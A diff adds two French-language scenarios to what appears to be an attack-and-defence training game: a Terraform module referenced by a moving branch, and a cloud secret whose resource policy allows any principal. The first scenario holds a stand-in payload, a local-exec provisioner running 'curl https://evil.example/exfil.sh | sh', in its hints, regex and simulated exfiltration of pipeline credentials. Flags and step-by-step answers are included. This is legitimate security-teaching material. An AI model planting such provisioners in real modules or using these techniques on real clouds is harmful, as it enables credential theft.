@@ -4728,6 +4728,160 @@ const SCENARIOS = [
     log.push({t:"[+] Mot de passe de j.martin réinitialisé via GenericAll, accès administrateur du domaine confirmé.", cls:'ok'});
     return {log, success:true};
   }
+},
+
+/* ===================== 60. Module Terraform non épinglé (supply chain) ===================== */
+{
+  id:'terraform-unpinned-module-supply-chain',
+  title:'Un module Terraform référencé par une branche mouvante ouvre la voie à une attaque de la chaîne d\'approvisionnement',
+  category:'Cloud & Infrastructure as Code (chaîne d\'approvisionnement Terraform)',
+  attack:{
+    who:'Vous incarnez bob, qui contrôlez la branche `main` du dépôt communautaire `labtools/tf-vpc-module` référencé par l\'infrastructure de target-lab (hors périmètre : comment vous y avez obtenu un accès en écriture).',
+    desc:"Le module réseau de target-lab est référencé par `?ref=main` plutôt que par un tag ou un hash de commit épinglé. À la prochaine exécution automatisée de `terraform apply` par le pipeline CI, Terraform retélécharge systématiquement le contenu actuel de cette branche — tout ce que vous y poussez s'exécute alors avec les identifiants cloud du pipeline.",
+    hints:[
+      "`cat /repo/infra/network.tf` révèle que le module `vpc` est référencé par `?ref=main`, une branche mouvante plutôt qu'un commit épinglé — Terraform en retélécharge le contenu actuel à chaque exécution.",
+      "`terraform-module-publish --repo labtools/tf-vpc-module --branch main --payload 'provisioner local-exec: curl https://evil.example/exfil.sh | sh'` pousse un provisioner malveillant sur cette branche partagée, en dehors du dépôt d'infrastructure de target-lab que vous ne contrôlez pas directement.",
+      "`terraform apply` (exécuté par le pipeline CI de target-lab) retélécharge la branche `main` du module désormais compromise et exécute votre provisioner avec les identifiants cloud du pipeline, sans qu'aucune revue de code n'ait jamais porté sur ce contenu externe."
+    ]
+  },
+  defense:{
+    who:'Vous incarnez désormais l\'administrateur infrastructure chargé de corriger la faille.',
+    desc:"Épinglez la référence du module à un hash de commit précis, pour que `terraform apply` retélécharge toujours exactement le même contenu déjà revu, quoi que devienne la branche `main` du module par la suite.",
+    hints:[
+      "Éditez `/repo/infra/network.tf` avec `nano` et remplacez `?ref=main` par `?ref=a1b2c3d4e5f67890abcdef1234567890abcdef12` (le hash du commit déjà audité).",
+      "`verify` confirme que le module est désormais référencé par un commit épinglé plutôt que par une branche mouvante."
+    ]
+  },
+  makeVfs(){
+    return {
+      '/':{type:'dir',perm:'755',owner:'root',children:['home','repo']},
+      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
+      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
+      '/repo':{type:'dir',perm:'755',owner:'root',children:['infra']},
+      '/repo/infra':{type:'dir',perm:'755',owner:'root',children:['network.tf']},
+      '/repo/infra/network.tf':{type:'file',perm:'644',owner:'root',size:110,
+        content:"module \"vpc\" {\n  source = \"git::https://github.com/labtools/tf-vpc-module.git?ref=main\"\n}\n"}
+    };
+  },
+  startUserAttack:'bob', startCwdAttack:'/repo/infra',
+  exploitRules:[
+    { pattern:/^cat\s+\/repo\/infra\/network\.tf$/, run(state, print){
+        print(state.vfs['/repo/infra/network.tf'].content, 'out');
+        const pinned = !/\?ref=main/.test(state.vfs['/repo/infra/network.tf'].content);
+        if(!pinned){ print("[i] Référence non épinglée (`ref=main`) : Terraform retéléchargera le contenu actuel de cette branche à chaque exécution.", 'info'); }
+      }
+    },
+    { pattern:/^terraform-module-publish\s+--repo\s+labtools\/tf-vpc-module\s+--branch\s+main\s+--payload\s+'provisioner\s+local-exec:\s+curl\s+https:\/\/evil\.example\/exfil\.sh\s+\|\s+sh'$/, run(state, print){
+        state.flags = state.flags || {};
+        state.flags.modulePoisoned = true;
+        print("[+] Provisioner malveillant poussé sur la branche main de labtools/tf-vpc-module.", 'ok');
+      }
+    },
+    { pattern:/^terraform\s+apply$/, run(state, print){
+        const pinned = !/\?ref=main/.test(state.vfs['/repo/infra/network.tf'].content);
+        if(pinned){
+          print('module.vpc: Downloading git::https://github.com/labtools/tf-vpc-module.git?ref=a1b2c3d... (commit épinglé, contenu inchangé)', 'out');
+          print("Apply complete! Resources: 0 added, 0 changed, 0 destroyed.", 'ok');
+          return;
+        }
+        if(!state.flags || !state.flags.modulePoisoned){
+          print('module.vpc: Downloading git::https://github.com/labtools/tf-vpc-module.git?ref=main', 'out');
+          print("Apply complete! Resources: 0 added, 0 changed, 0 destroyed.", 'ok');
+          return;
+        }
+        state.flags.pipelineCredsExfiltrated = true;
+        print('module.vpc: Downloading git::https://github.com/labtools/tf-vpc-module.git?ref=main (contenu modifié depuis le dernier apply)', 'out');
+        print("[+] Provisioner local-exec exécuté par le pipeline CI avec ses identifiants cloud — identifiants exfiltrés vers evil.example.", 'ok');
+        print("FLAG{terraform_unpinned_module_supply_chain}", 'flagline');
+      }
+    }
+  ],
+  attackCheck(state){ return state.flags && state.flags.pipelineCredsExfiltrated === true; },
+  defenseCheck(state){ return !/\?ref=main/.test(state.vfs['/repo/infra/network.tf'].content); },
+  replay(state){
+    const log=[];
+    const pinned = !/\?ref=main/.test(state.vfs['/repo/infra/network.tf'].content);
+    log.push({t:'$ terraform apply', cls:'prompt-line'});
+    if(pinned){
+      log.push({t:'module.vpc: Downloading ...?ref=a1b2c3d... (commit épinglé, contenu inchangé)', cls:'err'});
+      log.push({t:"[-] Le module est désormais épinglé à un commit précis : la faille est corrigée.", cls:'err'});
+      return {log, success:false};
+    }
+    log.push({t:"[+] Provisioner malveillant exécuté par le pipeline CI avec ses identifiants cloud.", cls:'ok'});
+    return {log, success:true};
+  }
+},
+
+/* ===================== 61. Politique de ressource publique (Secrets Manager) ===================== */
+{
+  id:'cloud-secretsmanager-public-resource-policy',
+  title:'Un secret cloud accessible depuis n\'importe quel compte via une politique de ressource sans restriction',
+  category:'Cloud & Infrastructure as Code (politique de ressource trop permissive)',
+  attack:{
+    who:'Vous incarnez bob, un attaquant sans le moindre identifiant dans le compte cloud de target-lab, mais qui connaît l\'identifiant du secret `prod/db/credentials` (repéré dans un journal de build public, hors périmètre de ce scénario).',
+    desc:"Le secret `prod/db/credentials` porte une politique de ressource qui autorise `\"Principal\": \"*\"`, sans la moindre condition restrictive de compte. N'importe quel principal cloud — y compris depuis un tout autre compte que vous contrôlez — peut donc le lire directement, sans jamais avoir eu besoin d'assumer le moindre rôle dans le compte cible.",
+    hints:[
+      "`cloud secretsmanager get-resource-policy --secret-id prod/db/credentials` (depuis un compte cloud quelconque que vous contrôlez) révèle une politique de ressource sans restriction de principal.",
+      "Le champ `\"Principal\": \"*\"` de cette politique signifie qu'aucune restriction de compte ni de rôle ne s'applique : n'importe qui connaissant l'identifiant du secret peut l'interroger.",
+      "`cloud secretsmanager get-secret-value --secret-id prod/db/credentials` récupère directement le contenu du secret depuis votre propre compte — sans jamais avoir eu besoin d'accéder au compte cloud de target-lab."
+    ]
+  },
+  defense:{
+    who:'Vous incarnez désormais l\'administrateur cloud chargé de corriger la faille.',
+    desc:"Restreignez la politique de ressource du secret à un compte cloud précis, sans casser l'accès des rôles légitimes de target-lab qui en ont réellement besoin.",
+    hints:[
+      "Éditez `/etc/cloud/secrets/prod-db-credentials-policy.json` avec `nano` et remplacez `\"Principal\": \"*\"` par `\"Principal\": \"arn:cloud:iam::111122223333:root\"` (le compte cloud légitime de target-lab).",
+      "`verify` confirme que la politique de ressource n'autorise plus n'importe quel principal."
+    ]
+  },
+  makeVfs(){
+    return {
+      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
+      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
+      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
+      '/etc':{type:'dir',perm:'755',owner:'root',children:['cloud']},
+      '/etc/cloud':{type:'dir',perm:'755',owner:'root',children:['secrets']},
+      '/etc/cloud/secrets':{type:'dir',perm:'755',owner:'root',children:['prod-db-credentials-policy.json']},
+      '/etc/cloud/secrets/prod-db-credentials-policy.json':{type:'file',perm:'644',owner:'root',size:130,
+        content:"{\n  \"Statement\": [{\n    \"Effect\": \"Allow\",\n    \"Principal\": \"*\",\n    \"Action\": \"secretsmanager:GetSecretValue\"\n  }]\n}\n"}
+    };
+  },
+  startUserAttack:'bob', startCwdAttack:'/home/bob',
+  exploitRules:[
+    { pattern:/^cloud\s+secretsmanager\s+get-resource-policy\s+--secret-id\s+prod\/db\/credentials$/, run(state, print){
+        state.flags = state.flags || {};
+        state.flags.policySeen = true;
+        print(state.vfs['/etc/cloud/secrets/prod-db-credentials-policy.json'].content, 'out');
+        const open = /"Principal":\s*"\*"/.test(state.vfs['/etc/cloud/secrets/prod-db-credentials-policy.json'].content);
+        if(open){ print("[i] Aucune restriction de compte : \"Principal\": \"*\" autorise n'importe quel appelant cloud.", 'info'); }
+      }
+    },
+    { pattern:/^cloud\s+secretsmanager\s+get-secret-value\s+--secret-id\s+prod\/db\/credentials$/, run(state, print){
+        const open = /"Principal":\s*"\*"/.test(state.vfs['/etc/cloud/secrets/prod-db-credentials-policy.json'].content);
+        if(!open){ print('AccessDeniedException: User is not authorized to perform secretsmanager:GetSecretValue on this resource.', 'err'); return; }
+        if(!state.flags || !state.flags.policySeen){ print("AccessDeniedException: vérifiez d'abord la politique de ressource de ce secret.", 'err'); return; }
+        state.flags.secretRead = true;
+        print('{"username":"produser","password":"Pr0dDbSecret!2024"}', 'ok');
+        print("[+] Secret de production récupéré depuis un tout autre compte cloud, sans jamais avoir accédé au compte cible.", 'ok');
+        print("FLAG{cloud_secretsmanager_public_resource_policy}", 'flagline');
+      }
+    }
+  ],
+  attackCheck(state){ return state.flags && state.flags.secretRead === true; },
+  defenseCheck(state){ return !/"Principal":\s*"\*"/.test(state.vfs['/etc/cloud/secrets/prod-db-credentials-policy.json'].content); },
+  replay(state){
+    const log=[];
+    const open = /"Principal":\s*"\*"/.test(state.vfs['/etc/cloud/secrets/prod-db-credentials-policy.json'].content);
+    log.push({t:'$ cloud secretsmanager get-secret-value --secret-id prod/db/credentials', cls:'prompt-line'});
+    if(!open){
+      log.push({t:'AccessDeniedException: User is not authorized to perform secretsmanager:GetSecretValue on this resource.', cls:'err'});
+      log.push({t:"[-] La politique de ressource restreint désormais le principal autorisé : la faille est corrigée.", cls:'err'});
+      return {log, success:false};
+    }
+    log.push({t:'{"username":"produser","password":"Pr0dDbSecret!2024"}', cls:'ok'});
+    log.push({t:"[+] Secret de production récupéré depuis un tout autre compte cloud.", cls:'ok'});
+    return {log, success:true};
+  }
 }
 
 ];
